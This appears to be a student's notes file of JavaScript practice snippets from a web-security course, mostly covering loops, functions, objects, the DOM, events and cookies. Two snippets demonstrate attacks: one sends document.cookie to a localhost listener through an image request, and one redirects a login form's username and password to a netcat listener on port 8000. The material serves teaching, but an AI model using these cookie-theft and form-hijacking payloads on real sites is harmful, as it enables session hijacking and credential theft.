
..[Loop].............................................................
var name = 'rohit'
switch(name){
case 'rohit' : alert('Aman') ; break;
case 'jony' : alert('Jony') ; break;
default : alert('Unknown') ; break;
}
..[While Loop].............................................................
var a = 5 ; var b = 10;

while (a <= b ){
  alert(a);
  a+=1;
}
..[Loop]05.html.............................................................
<body>
<script>
	var c = 20;

//	while(c>0){
	//document.write("<br>counter value is : "+c)
//	document.write("<p>counter value is : "+c+"</p>"); 
//	c--;
//	}

	for ( c = 20 ; c > 0 ; c--)
	{
	document.write("<p>Value is : "+c+"</p>");
	}
</script>
</body>

..[function]06.html.............................................................
<body>
<script>
//	function CallMe() { alert("Hello,I'm a function"); }
//	CallMe();

//	function sum(num1,num2) { 
//	var add = num1 + num2 ; 
	//document.write("Sum of "+num1+" And "+num2+" is = "+add); 
//	return add;
//	}
//	var s = sum(560,25);
//	alert(s);
	var global_a = 100;
	function myScope(){ var global_a = 200; return global_a ;}
	var x = myScope();
	alert(x);
</script>
</body>
..[Object]07.html.............................................................

<body>
<script>

	function Vuln(desc,cveid) {
	this.desc = desc;
	this.cveid = cveid;
	this.detAlert = function() 
		{
		alert(this.desc+' : '+this.cveid);
		}
	}
	var V1 = new Vuln("XSS in HTML" , 1234 );
//	alert(V1.desc);
//	alert(V1.cveid);
	V1.detAlert();
</script>
</body>
...................................................................................................
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in

<body>
<script>
//Enumeration-Object
	function Vuln(desc,cveid) {
	this.desc = desc;
	this.cveid = cveid;
	this.detAlert = function() 
		{ alert(this.desc+' : '+this.cveid); }
	}
	var V1 = new Vuln("XSS in HTML" , 1234 );
//	alert(V1.desc);
//	V1.detAlert();
	Vuln.prototype.detAlert2 = function () { alert("I'm Prototype Definition"); }
	V1.detAlert2();

	for (prop in V1)
	{ alert(prop +':'+V1[prop]); }
</script>
</body>
...................................................................................................
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys
<body>
<script>
	function Vuln(desc,cveid) {
	this.desc = desc;
	this.cveid = cveid;
	this.detAlert = function() 
		{ alert(this.desc+' : '+this.cveid); }
	}
	var V1 = new Vuln("XSS in HTML" , 1234 );
//	alert(V1.desc);
//	V1.detAlert();
	Vuln.prototype.detAlert2 = function () { alert("I'm Prototype Definition"); }
//	V1.detAlert2();
//Enumeration-Object
//	for ( x in V1)    { alert( x +':'+V1[x]); }	
	alert(Object.getOwnPropertyNames(V1));		//output says : desc,cveid,detAlert
	alert(Object.keys(V1));				//output says : desc,cveid,detAlert
</script>
</body>
..[DOM].09.html..............................................................................................
https://developer.mozilla.org/en/docs/DOM
www.w3.org/TR/REC-DOM-Level-1/introduction.html

<body>
<h1 id="title"> I'm h1 tag for Title</h1>
<h2>First h2 Tags </h2>
<h2>Second h2 Tags </h2>
   <script>
//	var var1 = document.getElementById("title");
//	alert("Alert");
//	var1.innerHTML = "Here is innerHTML."
	
	var h2tags = document.getElementsByTagName("h2");
	alert(h2tags.length);

	h2tags[0].innerHTML = "I'm Replacing at h2 Tag";

	for( i=0; i < h2tags.length ; i++)
	{ alert(h2tags[i].innerHTML);	}

   </script>
</body>
..[EventHandler].10.html................................................................................................
https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Event_handlers

<body>
<!-- <h1 id="js" onclick="alert('onclick Handler')"> Welcome to JavaScript</h1> -->
<h1 id="js"> Welcome to JavaScript</h1>
	<script>
//	document.getElementById("js").onmouseover = function(event) { alert("Event Occure onMouseOver"); } 
	document.getElementById("js").addEventListener('click', function(event) { alert("click Handler");} , false); 
	</script>
</body>
..[cookie].11.html................................................................................................
https://developer.mozilla.org/en-US/docs/Web/API/document.cookie

<body> <h1 id="temp"> Hello JS </h1>
	<script>
	document.cookie = "sessionsid=2438923242452523452;" ;
	document.cookie = "userid=12394;";
//	document.cookie = "sessionsid=2438923242452523452;userid=12394;" ;
	alert(document.cookie);

//	cook = document.cookie.split(';');
//	for ( i=0 ; i < cook.length; i++) { alert(cook[i]); }

//	destroying cookie
//	document.cookie = "userid=; expires=Thu, 01 Jan 1970 00:00:00 UTC;";
	document.cookie = "sessionsid=; expires=Thu, 01 Jan 1970 00:00:00 UTC;";
	alert(document.cookie);
	</script>
</body>
..[Stealing+Cookie].12.html................................................................................................
<body> <h1 id="temp"> Hello JS </h1>
	<script>
	document.cookie = "sessionid=999999999242452523452;" ;
//	alert(document.cookie);
//	document.location = "http://localhost:8000/?"+document.cookie;
//	document.location = "http://google.com/?"+document.cookie;

//	document.write('<img height=100 width=100 src="http://localhost:8000/?'+document.cookie+'" />');
	new Image().src = "http://localhost:8000/?"+document.cookie;
	</script>
</body>
..[Exception].13.html................................................................................................
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/try...catch
<body> <h1 id="temp"> Hello JS </h1>
	<script>
		try {
//		DoesNotExist();
		throw "It is a custom Exception";
	}
		catch(err) {
//		document.write("<br>Error Occure : "+err.message);
		document.write("<br>Here, throw Error : "+err);
	}
		finally {
		document.write("<BR><br>Finally Block : I'm Finally Executed in both Cases.");
	}
	</script>
</body>
..[Form-Manipulation].14.html.............................................................................................
<body> <h1 id="temp"> Hello JS </h1>
<form id="test" action="/authentication" method="get">
	Username : <input type="text" name="username"> <br>
	Password : <input type="password" name="pass"><br>
	<input type="submit" value="submit">
</form>
<script>
	function InterceptForm() {
//	return true;  // if true then form will execute.
		//First Way to access form Data
//	alert(document.forms["test"]["username"].value);
//	alert("Username:"+document.forms["test"]["username"].value+"\nPassword : "+document.forms["test"]["pass"].value);
		//Second Way to access form Data 
//	alert(document.forms[0].elements[0].value);
//	alert(document.forms[0].elements[1].value);
//	document.forms[0].elements[0].value = "Jack Sparrow";
//	return false;
	document.forms[0].action = "http://localhost:8000";		//nc -l -vv -p 8000
	return true;
	}
	test.onsubmit = InterceptForm;
</script>
</body>
................................................................................................
https://developer.mozilla.org/en-US/docs/HTML_in_XMLHttpRequest
pentesteracademylab.appspot.com/lab/webapp/jfp/basics?url=www
pentesteracademylab.appspot.com/lab/webapp/jfp/2

pentesteracademylab.appspot.com/lab/webapp/jfp/xml

XHR for XML
pentesteracademylab.appspot.com/lab/webapp/jfp/xml?url=333

